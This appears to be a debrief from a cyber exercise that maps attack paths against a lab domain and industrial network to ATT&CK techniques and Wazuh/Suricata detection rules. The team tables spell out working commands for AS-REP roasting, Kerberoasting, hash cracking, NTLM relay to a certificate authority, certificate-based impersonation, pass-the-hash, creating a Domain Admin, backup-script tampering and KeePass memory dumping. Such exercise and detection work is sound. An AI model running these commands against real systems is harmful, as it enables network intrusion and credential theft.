# Introduction

This document collects TTPs for the attack paths:

- all built-in attacks paths 
- attack path of overall winners team2
- attack path of IT winners team6

## Featured attacks

The ID mentioned maps to the attack vectors documented in `Attack_Chains.md`.

| ID  | Featured attack/vulnerability | Technique(s) | Detection Logic | 
|-----|-------------------------------|--------------|-----------------|
| N/A | N/A | T1018 - Remote System Discovery | Wazuh rules 100080 through 100098 handle Suricata Alerts<br>Suricata rules: SID 3400001 through 3400021 | 
| AV2 | SMB logins towards attacker kali machine to simulate LLMNR poisoning | T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay | N/A |
| AV2 | Relaying SMB/NTLM authentication to certificate authority (ESC8)     | T1649 - Steal or Forge Authentication Certificates<br> T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay | Wazuh rules 100070 and 100071 handle NTLM relaying<br>Suricata rules 20 through 22 flag NTLMSSP challenges |
| AV2 | Offline cracking captured NTLMv2 hashes | T1110.002 - Brute Force: Password Cracking | N/A |
| AV3 | Gather employee names from website | T1593 - Search Open Websites/Domains | N/A |
| AV3 | Brute force user with weak credentials | T1110.001 - Brute Force: Password Guessing | Wazuh rule 60204 alerts multiple (8+) failed logins in a timeframe | 
| AV3 | AS-REP roast users using username list | T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting | Wazuh rules 100030 through 100032 and 100060 alert AS-REP tickets without pre-authentication |
| AV2 | Offline cracking captured AS-REP hashes | T1110.002 - Brute Force: Password Cracking | N/A |
| AV4 | Searching file shares for documents of interest | T1078.002 - Valid Accounts: Domain Accounts<br>T1039 - Data from Network Shared Drive | Wazuh rules 100020 and 100021 alert access on honey file |
| N/A | Accessing web browser safed passwords | T1078.002 - Valid Accounts: Domain Accounts<br>T1555.003 - Credentials from Password Stores: Credentials from Web Browsers | N/A | 
| AV7 | User accounts with SPN set | T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting | Wazuh rule 100010 alerts on TGS for honey token account<br>Wazuh rules 100006, 100007 and 100101 through 100105 alert on kerberoasting |
| AV8 | Lateral movement to trusted domain by abusing trust relationship | T1199 - Trusted Relationship | N/A |
| AV9 | Credential access on the Fileserver in the Enterprise Network | T1039 - Data from Network Shared Drive | Wazuh rules 100020 and 100021 alert on honey file access |
| AV10 | Credentials from Web Browser on CLI1 | T1555.003 - Credentials from Password Stores: Credentials from Web Browsers | N/A |
| AV11<br>AV12 | Lateral Movement to Jump Host (JUMP) using RDP | T1078.002 - Valid Accounts: Domain Accounts | Wazuh rule 92657 alerts on successful logons |
| AV13 | Tampering of Backup Script | T1053.005 - Scheduled Task/Job: Scheduled Task | Wazuh rule 100200 monitors changes in backup script |
| AV14 | Process Discovery on Jump Host (JUMP) | T1057 - Process Discovery | N/A |
| AV15 | Exploiting CVE-2023-32784 in KeePass.exe | T1555.005 - Credentials from Password Stores: Password Managers | Wazuh rule 100210 alerts anomalous process access to KeePass.exe |
| AV16 | Lateral movement to the Grafana web application | N/A | N/A |
| AV17 | Operational information is exfiltrated from Grafana | | N/A |
| AV18 | Credential Access on the Jumphost (password-protected SSH-Key) | T1552.004 - Unsecured Credentials: Private Keys<br>T1110.002 - Brute Force: Password Cracking | N/A |
| AV18 | Lateral Movement to the Data Historian | T1021.004 - Remote Services: SSH | Wazuh rule 5715 alerts on successful SSH authentication |
| AV19 | Privilege Escalation on the Data Historian | T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching | N/A |
| AV21 | Lateral Movement to the Engineering Workstation (ENG) | T1078.002 - Valid Accounts: Domain Accounts | Wazuh rule 92657 alerts on successful logons |
| AV27 | PLC IDE Access on the Engineering Workstation | T1078.002 - Valid Accounts: Domain Accounts<br>T1039 - Data from Network Shared Drive | N/A |
| AV28<br>FLAG2 | Modification of Program Logic | T0836 - Modify Parameter | Wazuh rules 100080 through 100098 handle Suricata Alerts<br>Suricata rules 1336 and 1337 alert anomalous traffic to PLC |


## team6

| ID  | Featured attack/vulnerability | technique(s) | tool(s) and command(s) |
|-----|------------------------|--------------|---------|
| N/A | N/A | T1018 - Remote System Discovery<br>T1046 - Network Service Discovery | `nmap` |
| AV3 | Gather employee names from website | T1593 - Search Open Websites/Domains | Web Browser |
| AV3 | AS-REP roast users using username list | T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting | `impacket-GetNPUsers -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip 10.0.6.11 'plumetech/'` |
| AV2 | Offline cracking captured AS-REP hashes | T1110.002 - Brute Force: Password Cracking | `hashcat -m 18200 ASREProastables.txt rockyou.txt` |
| N/A | Discover Domain User SID | T1087.002 - Account Discovery: Domain Account | `Get-ADUser manuel` | 
| N/A | Request certificate with alternate UPN | T1649 - Steal or Forge Authentication Certificates<br>T1078.002 - Valid Accounts: Domain Accounts | `certipy-ad req -dc-ip 10.0.6.11 -u debbie@PLUMETECH.LOCAL -p '25800ellie' -template Smartcard -upn manuel@PLUMETECH.LOCAL -ca PLUMETECH-DC1-CA -target DC1.PLUMETECH.LOCAL -sid "S-1-5-21-514844351-3181471642-2638765006-1103"`<br>`certipy-ad auth -pfx manuel.pfx -dc-ip 10.0.6.11`
| N/A | Move laterally using WinRM | T1021.006 - Remote Services: Windows Remote Management<br>T1550.002 - Use Alternate Authentication Material: Pass the Hash | `evil-winrm -i 10.0.6.11 -u manuel -H XXXXXXXX` |
| FLAG1 | Create Domain Admin user | T1136.002 - Create Account: Domain Account | `New-AdUser -Name 'plumber'` <br> `Add-ADGroupMember -Identity 'Domain Admins' -Members 'plumber'` <br> `Set-ADAccountPassword -Identity 'plumber' -NewPassword (ConvertTo-SecureString -AsPlainText "XXXXXXXX" -Force) -Reset` <br> `Enable-AdAccount -Identity plumber` |


## team2

| ID  | Featured attack/vulnerability | technique(s) | tool(s) |
|-----|------------------------|--------------|---------|
| N/A | Lack of SMB Signing | T1018 - Remote System Discovery<br>T1046 - Network Service Discovery | `nxc smb 10.0.2.0/24 --gen-relay-list list.txt` |
| N/A | N/A | T1018 - Remote System Discovery | `nmap` |
| AV2 | Relaying SMB/NTLM authentication to certificate authority (ESC8)     | T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay | `impacket-ntlmrelayx -t 10.0.2.12 -smb2support -socks` |
| N/A | Discover Domain User SID | T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay<br>T1087.002 - Account Discovery: Domain Account | `proxychains4 impacket-lookupsid -no-pass -domain-sids PLUMETECH/JULIAN@10.0.2.12`<br> `Get-ADUser manuel` |
| AV4 | Searching file shares for documents of interest | T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay<br>T1039 - Data from Network Shared Drive | `proxychains4 smbclient -L //10.0.2.12/ -U PLUMETECH/julian`<br>`proxychains4 smbclient //10.0.2.12/IT -U PLUMETECH/julian` |
| AV3 | AS-REP roast users using username list | T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting | `nxc ldap 10.0.2.11 -d PLUMETECH -u debbie -p '' --asreproast output.txt` |
| AV2 | Offline cracking captured AS-REP hashes | T1110.002 - Brute Force: Password Cracking | `hashcat -m 18200 -a 0 -O debbie.txt rockyou.txt` |
| AV7 | User accounts with SPN set | T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting<br>T1078.002 - Valid Accounts: Domain Accounts | `nxc ldap 10.0.2.11 -d PLUMETECH -u debbie -p 'XXXXXXXX' --kerberoasting krb.txt` |
| N/A | Discover Domain User Description | T1087.002 - Account Discovery: Domain Account<br>T1078.002 - Valid Accounts: Domain Accounts | `nxc ldap 10.0.2.11 -d PLUMETECH -u calvin -p 'XXXXXXXX' -M get-desc-users` |
| N/A | Request certificate with alternate UPN | T1649 - Steal or Forge Authentication Certificates<br>T1078.002 - Valid Accounts: Domain Accounts | `certipy-ad find -u calvin -p XXXXXXXX -dc-ip 10.0.2.11`<br>`certipy-ad req -target-ip 10.0.2.11 -upn "marla@plumetech.local" -u calvin@plumetech.local -p XXXXXXXX -template "Smartcard" -ca PLUMETECH-DC1-CA -sid "S-1-5-21-514844351-3181471642-2638765006-1116"`<br>`certipy-ad auth -pfx marla.pfx -dc-ip 10.0.2.11 -domain PLUMETECH.LOCAL` |
|| Move laterally using psexec-like tool | T1021.002 - Remote Services: SMB/Windows Admin Shares<br>T1550.002 - Use Alternate Authentication Material: Pass the Hash | `git clone https://github.com/sensepost/susinternals`<br>`cd susinternals`<br>`python3 psexecsvc.py PLUMETECH/marla@10.0.2.11 -hashes XXXXXXXX:XXXXXXXX -system` |
| FLAG1 | Create Domain Admin user | T1136.002 - Create Account: Domain Account | `net user plumber XXXXXXXX /domain /add & net group "Domain Admins" plumber /add & net user fernando XXXXXXXX /domain` |
| AV11 | Lateral Movement to Jump Host (JUMP) using RDP | T1078.002 - Valid Accounts: Domain Accounts<br>T1021.001 - Remote Services: Remote Desktop Protocol | `mstsc.exe` |
| AV13 | Tampering of Backup Script | T1007 - System Service Discovery<br>T1053.005 - Scheduled Task/Job: Scheduled Task | added `net user Administrator XXXXXXXX` to `Backup.ps1` |
| AV15 | Exploiting CVE-2023-32784 in KeePass.exe | T1057 - Process Discovery<br>T1010 - Application Window Discovery<br>T1087.001 - Account Discovery: Local Account<br>T1555.005 - Credentials from Password Stores: Password Managers | Dump KeePass.exe using `taskmgr.exe`<br>`.\keepass-dump-extractor.exe .\KeePass.DMP` |
| AV21 | Lateral Movement to the Engineering Workstation (ENG) | T1078.002 - Valid Accounts: Domain Accounts<br>T1021.001 - Remote Services: Remote Desktop Protocol | `mstsc.exe` |
| N/A | Discovery of PLC password in E-Mail found on mapped share | T1552 - Unsecured Credentials<br> | `explorer.exe` |
| AV27 | PLC IDE Access on the Engineering Workstation | T1078.002 - Valid Accounts: Domain Accounts<br>T1039 - Data from Network Shared Drive | PLCNext |
| AV28<br>FLAG2 | Modification of Program Logic | T0836 - Modify Parameter | PLCNext |

